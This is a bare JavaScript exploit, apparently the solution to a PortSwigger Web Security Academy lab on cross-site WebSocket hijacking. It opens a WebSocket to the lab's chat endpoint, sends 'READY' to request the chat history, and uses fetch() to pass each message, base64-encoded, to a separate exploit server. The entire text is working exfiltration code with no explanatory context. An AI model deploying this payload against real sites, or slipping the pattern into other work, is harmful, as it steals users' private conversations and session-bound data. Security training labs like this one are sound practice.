var ws = new WebSocket(
    "wss://0a0f004a039b5ee38090034400de00bc.web-security-academy.net/chat"
);

ws.onopen = function () {
    ws.send("READY")
};

ws.onmessage = function(event) {
    fetch("https://exploit-0aab00cc035c5e5580c802f9017d00ae.exploit-server.net/exploit" + 
        btoa(event.data));
};